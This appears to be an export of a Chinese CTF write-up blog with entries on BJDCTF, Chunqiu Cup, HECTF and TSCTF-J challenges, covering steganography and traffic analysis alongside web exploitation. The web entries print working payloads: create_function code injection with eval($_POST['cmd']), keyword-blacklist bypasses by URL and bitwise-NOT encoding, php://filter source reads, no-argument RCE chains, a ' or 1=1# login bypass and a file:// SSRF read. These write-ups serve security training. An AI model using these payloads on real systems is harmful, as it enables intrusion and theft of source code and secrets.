<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">afunc</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">afunc</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">//输出3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>但由于$code参数可控，可能会存在代码注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$aFunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return($a+$b);&#125;eval($_POST[&#x27;</span>cmd<span class="string">&#x27;]);//&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aFunc</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="comment">//&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>而本题的<code>$code(&#39;&#39;, $arg); //此处存在create_function()注入</code>中可以通过控制<code>$arg</code>来进行代码注入<br>首先保证传入的<code>$code</code>为create_funtion，<br>其次是<code>$arg</code>参数，本题中过滤了<code>cat、flag、scan</code>等关键字，无法直接命令执行得到flag的值，在网上查阅后找到了合适的函数<code>get_defined_vars()</code>直接输出所有变量，构造payload如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fl%<span class="number">61</span>g[c%<span class="number">6</span>fde]=create_function&amp;fl%<span class="number">61</span>g[%<span class="number">61</span>rg]=&#125;<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());<span class="comment">//</span></span><br></pre></td></tr></table></figure>
<p>完整payload为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://eae699b4-88c8-4f9c-865c-e0162d247a20.node4.buuoj.cn:81/1nD3x.php</span><br><span class="line">?deb%75=aq%75a_is_c%75te%0a</span><br><span class="line">&amp;file=data://text/plain,deb%75_deb%75_aq%75a</span><br><span class="line">&amp;sh%61na[]=1</span><br><span class="line">&amp;p%61sswd[]=2</span><br><span class="line">&amp;fl%61g[c%6fde]=create_function</span><br><span class="line">&amp;fl%61g[%61rg]=&#125;var_dump(get_defined_vars());//</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/715c25d6ff1f4910ada9a20fcb2b5bc0.png" alt="在这里插入图片描述"></p>
<h1 id="Part-8-继续注入"><a href="#Part-8-继续注入" class="headerlink" title="Part 8 (继续注入)"></a>Part 8 (继续注入)</h1><p><img src="https://img-blog.csdnimg.cn/4b94fe00e2654d3cb96deb97cfc4ee4d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>网页中出现了一张图片和所有的变量，我们在其中找到flag</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="string">&quot;ffffffff11111114ggggg&quot;</span>]=&gt;</span><br><span class="line">  <span class="title function_">string</span>(<span class="number">89</span>) <span class="string">&quot;Baka, do you think it&#x27;s so easy to get my flag? I hid the real flag in rea1fl4g.php 23333&quot;</span></span><br></pre></td></tr></table></figure>
<p>这个题可以说是有点恶心了，在最后居然还不给flag，还要让我继续访问<code>rea1fl4g.php</code>。。。<br><img src="https://img-blog.csdnimg.cn/31761b8c745d460ba7b250626e7d4953.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>通过网页标题可知，真的flag就在这个文件里，但我们要想办法拿到，可以继续使用<code>get_defined_vars()</code>，但前提是必须包含这个文件。<br>但在<strong>Part 7</strong>的黑名单中屏蔽了<code>inc</code>故无法使用<code>include</code>，我们可用<code>require</code>代替。<br>黑名单还屏蔽了点号，故文件名无法直接输入，可以使用base64将文件名编码绕过<br><img src="https://img-blog.csdnimg.cn/8f5f73a31fab4c53804284ba1d488f0b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fl%<span class="number">61</span>g[c%<span class="number">6</span>fde]=create_function</span><br><span class="line">&amp;fl%<span class="number">61</span>g[%<span class="number">61</span>rg]=&#125;<span class="keyword">require</span>(base64_dec%<span class="number">6</span>fde(cmVhMWZsNGcucGhw));<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());<span class="comment">//</span></span><br><span class="line"><span class="comment">//%6c为url编码的o，为了绕过黑名单</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/08c2636d45e147a9905a66bd92fe4aa3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><code>[&quot;f4ke_flag&quot;]=&gt; string(28) &quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot; &#125; </code><br>本来以为到这就结束了，提交后发现又是错的flag，不知道出题人为啥要这样，不过既然只有<code>rea1fl4g.php</code>有真的flag，就只能猜测flag藏在源码里。<br>要读取源码就要用到<code>php://filter</code>伪协议<br>需要构造以下payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);</span><br></pre></td></tr></table></figure>
<p>为了绕过诸多的屏蔽词，选择取反操作</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=rea1fl4g.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fl%<span class="number">61</span>g[%<span class="number">61</span>rg]=&#125;<span class="keyword">require</span>(~(%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%C5%D0%D0%<span class="number">99</span>%<span class="number">96</span>%<span class="number">93</span>%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">8</span>D%D0%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%C2%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">91</span>%<span class="number">89</span>%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B%D1%<span class="number">9</span>D%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">9</span>A%C9%CB%D2%<span class="number">9</span>A%<span class="number">91</span>%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">9</span>B%<span class="number">9</span>A%D0%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">90</span>%<span class="number">8</span>A%<span class="number">8</span>D%<span class="number">9</span>C%<span class="number">9</span>A%C2%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%CE%<span class="number">99</span>%<span class="number">93</span>%CB%<span class="number">98</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F));<span class="comment">//</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/b6d2af0cb9b74c0d9ada8a4ee0843a91.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>成功拿到源码，将base64拿去解码可以得到<br><img src="https://img-blog.csdnimg.cn/500c6522f70845fa8dbb9b9bf1108fac.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到真的flag</p>
<p><code>flag&#123;b818582a-d278-4269-9a9d-9782de5ec0c5&#125;  //动态flag</code></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
]]></content>
      <tags>
        <tag>BJDCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>春秋杯2021-勇者山峰 helloshark</title>
    <url>/2021/11/28/helloshark/</url>
    <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/96d85a3146e34306a83cdf851357dddc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>本题附件打开是一个bmp图片<br><img src="https://img-blog.csdnimg.cn/a802931fe86243dfb6e3d8e3598d5dcf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>尝试用010查看该文件，搜索PK文本<br><img src="https://img-blog.csdnimg.cn/98f118303329408984c9edfb23ccaf39.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现文件末尾隐藏了一个压缩包<br><img src="https://img-blog.csdnimg.cn/3a53fe86e4d748c9b3d6370b012c57b8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>将后缀名改为zip后打开压缩包，发现有两个文件，但是解压需要密码，其中有提示说密码在图片中。<br>尝试各种工具来解析这个图片，最后可以用<code>zsteg</code>来得到压缩包密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zsteg -a 文件名</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/a45806491d9e4316a682b9e77bd8d2f0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>用密码解压文件，用wireshark打开流量包<br><img src="https://img-blog.csdnimg.cn/d67363d0f6e94f88b63799aa23b4c8a9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>追踪tcp流得到疑似flag的字符串文本<br><img src="https://img-blog.csdnimg.cn/de44d4ba7fa140b18be395de51d0d7f5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>写脚本跑出结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;ws.txt&quot;</span>):</span><br><span class="line">    rs = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;cmd.realMsg..privateMsg&quot;</span> <span class="keyword">in</span> rs:</span><br><span class="line">        tmp=rs.split(<span class="string">&#x27;||&#x27;</span>)</span><br><span class="line">        flag+=tmp[<span class="number">0</span>][-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/00288a45bf324ea2986d01634476bb7e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <tags>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>HECTF 捉迷藏</title>
    <url>/2021/11/14/hideandseek/</url>
    <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/048f5f3dc4fe4344978c65b510e5f6ff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>一道简单的misc题，下载附件后打开压缩包</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/1b71f82fe6f045d9a3ed93c34e4a5570.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>解压后打开docx文档</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/860a4140806848fea51b34ac89560b92.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>打开后是纯文字，首先想到可能是隐写</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/0d1d1d403962430c8f1af862a4e61d66.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>打开隐藏文字后发现也并无用处</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/76db54a0ee0d44da815a7a768ca43ed1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>使用010打开该文档后发现有PK开头，于是可以尝试压缩包打开</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/96704c982a204438a8bb30eca0cdeafe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>打开后发现是xml文件</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/8be9906de2704fd180173d5655d3649a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>查看各个文件后发现可疑信息，由括号组成的js代码，可在控制台中直接运行，由于文件中的括号代码有很多段，尝试拼接后在控制台运行</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/ebb5dc558aef40f4a912a18e3ec77298.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>控制台运行后得到flag</p>
</blockquote>
]]></content>
      <tags>
        <tag>隐写</tag>
      </tags>
  </entry>
  <entry>
    <title>春秋杯2022 - Web</title>
    <url>/2022/05/07/ichunqiu2022/</url>
    <content><![CDATA[<h1 id="Mercy-code"><a href="#Mercy-code" class="headerlink" title="Mercy-code"></a>Mercy-code</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z_]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|if|localeconv|phpversion|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;What are you thinking?&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Please calm down&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>见面就是源码，考点是无参数RCE，本题黑名单如此之多，很多的函数都无法使用，首先要考虑扫目录，scandir是没用被过滤的，关键在于如何生成点<code>.</code>，生成点的方法从网上可以搜集到很多，这里总结一下</p>
<h2 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h2><ul>
<li>current()- 返回数组中的当前元素的值</li>
<li>end()- 将内部指针指向数组中的最后一个元素，并输出</li>
<li>next()- 将内部指针指向数组中的下一个元素，并输出</li>
<li>prev()- 将内部指针指向数组中的上一个元素，并输出</li>
<li>each()- 返回当前元素的键名和键值，并将内部指针向前移动<h2 id="输出函数"><a href="#输出函数" class="headerlink" title="输出函数"></a>输出函数</h2></li>
<li>print_r()</li>
<li>var_dump()</li>
<li>echo(implode())（implode可以将数组转化为字符串）</li>
</ul>
<h2 id="无参数文件读取"><a href="#无参数文件读取" class="headerlink" title="无参数文件读取"></a>无参数文件读取</h2><p><strong>localeconv()：</strong><br>localeconv() 函数返回一包含本地数字及货币格式信息的数组。数组第一项就是点号<code>print_r(scandir(pos(localeconv())));</code>，pos是current的别名</p>
<p><strong>phpversion()：</strong></p>
<ul>
<li><code>phpversion() </code>返回PHP版本，如7.3.5</li>
<li><code>floor(phpversion())</code>返回7</li>
<li><code>sqrt(floor(phpversion()))</code>返回2.6457513110646</li>
<li><code>tan(floor(sqrt(floor(phpversion()))))</code>返回-2.1850398632615</li>
<li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回4.5017381103491</li>
<li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回45.081318677156</li>
<li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回46</li>
<li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回点<code>.</code></li>
<li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>扫描当前目录</li>
<li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>返回点点<code>..</code></li>
</ul>
<p><strong>crypt()：</strong></p>
<p>crypt()返回使用 DES、Blowfish 或 MD5 算法加密的字符串。</p>
<ul>
<li><code>chr(ord(hebrevc(crypt(phpversion()))))</code>返回点<code>.</code></li>
<li><code>chr(ord(strrev(crypt(serialize(array())))))</code>返回点<code>.</code></li>
</ul>
<p><strong>time()：</strong></p>
<ul>
<li><code>char(time())</code>chr() 函数以256为一个周期，所以 chr(46)、chr(302)、chr(558)等都等于点<code>.</code>所以使用chr(time()) 一个周期必能出现一次。</li>
<li><code>chr(current(localtime(time())))</code>localtime()以数值数组和关联数组的形式输出本地时间，数组第一个值每秒加 1 ,所以最多 60 秒之内就可以得到 46 .然后用 current()函数即可获得 第一位键值。再利用 chr() 函数就可以完美获得 .</li>
</ul>
<p><strong>uniqid()</strong><br>uniqid()函数能够生成动态的字符串，但是他的前半部分是固定不变的，但是后半部分是动态变化的，正好strrev()函数也可以使用，那么我们就可以将它反转过来然后直接转换为char，构造任意字符。</p>
<ul>
<li><code>chr(strrev(uniqid()))</code>获取一个点</li>
<li><code>next(scandir(chr(strrev(uniqid()))))</code>获取两个点</li>
</ul>
<h2 id="读文件函数"><a href="#读文件函数" class="headerlink" title="读文件函数"></a>读文件函数</h2><ul>
<li>show_source()</li>
<li>readfile()</li>
<li>highlight_file()</li>
<li>file_get_contents()</li>
<li>readgzfile()</li>
<li>file()</li>
</ul>
<h2 id="最终构造"><a href="#最终构造" class="headerlink" title="最终构造"></a>最终构造</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=<span class="keyword">echo</span>(<span class="title function_ invoke__">implode</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">uniqid</span>()))))); 用于读取当前目录</span><br></pre></td></tr></table></figure>
<p>由于这个函数返回的是随机字符串，所以需要进行爆破，随机到点号就可以爆出当前目录<br><img src="https://img-blog.csdnimg.cn/0efb7f59c287479586dea202b52d9ce8.png" alt="在这里插入图片描述"><br>当前目录有index.php和一个x8dkli-jsikc7-ffllag-xx898a.php<br>很明显，后者就是flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">uniqid</span>()))))); 读取后者</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/d9e410a5eb63422cb23dff6c11d1ae58.png" alt="在这里插入图片描述"></p>
<h1 id="picture-convert"><a href="#picture-convert" class="headerlink" title="picture convert"></a>picture convert</h1><p>没做出来，等wp出来后学习一下</p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>HECTF JamesHarden</title>
    <url>/2021/11/13/jamesharden/</url>
    <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/08080da26d9749b8a6bcc91db363423f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>一道简单的misc题，下载附件后打开压缩包</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/547db803ea0e45cfab19497c2d1a6d45.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>将这个无后缀的文件先放入010中看看，判断文件类型</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/8121483e8a034d2d9934826f4469b7cf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>看到以PK开头可初步确认为压缩包，将后缀名改为zip后成功打开</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/ff976b2efdf2429aa876ac3055f50fca.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>压缩包中是一个.class文件，这里应该使用java反编译来解析.class文件，还原成java代码来寻找信息</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/35257520867e4f9ca417a5f8c31e017a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>打开.class文件后发现字符串<code>URPGS&#123;Jr1p0zr_G0_U3pg6_!&#125;</code>，这个字符串和flag的形式很像，但是其中的字母应该经过了移位，用凯撒密码来解密</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/edac841e506a46409bcf1f579bc70dc2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<blockquote>
<p>将位移设为14解出真正的flag</p>
</blockquote>
]]></content>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>TSCTF-J Ezphp</title>
    <url>/2021/11/05/ezphp/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>考察sql注入（万能密码），ssrf（file协议），反序列化（pop链构造）</p>
<h1 id="一、题目"><a href="#一、题目" class="headerlink" title="一、题目"></a>一、题目</h1><p><img src="https://img-blog.csdnimg.cn/af1fcbd1605d474693530b09839eb500.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="题目图"></p>
<h1 id="二、题解"><a href="#二、题解" class="headerlink" title="二、题解"></a>二、题解</h1><h2 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h2><p>启动环境发现是一个简单的登陆页面<br>先上万能密码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; or 1=1#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/d9d9cad9e95f48628c3e71f21043f4b0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><font color=#999AAA >此处也可以使用sql注入，查询用户表，得到用户名为admin，密码为12345678</p>
<h2 id="Part-2"><a href="#Part-2" class="headerlink" title="Part 2"></a>Part 2</h2><p><img src="https://img-blog.csdnimg.cn/b73389ae9529415a9faa52f8388154be.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>提示&#x2F;tmp&#x2F;hint.php，观察地址栏提示的ssrf以及?path&#x3D;<br>尝试使用伪协议发现php:&#x2F;&#x2F;被过滤（www也被过滤）</p>
<p><img src="https://img-blog.csdnimg.cn/4b0f108f4bbb4270b624a3af65c1ab1c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>只能选用file协议来访问文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?path=file:<span class="comment">///tmp/hint.php</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/781cccb78514427ba80316cc4a1443a0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在hint.php找到疑似源代码</p>
<h2 id="Part-3"><a href="#Part-3" class="headerlink" title="Part 3"></a>Part 3</h2><p>将源代码扒下来整理好格式开始审计</p>
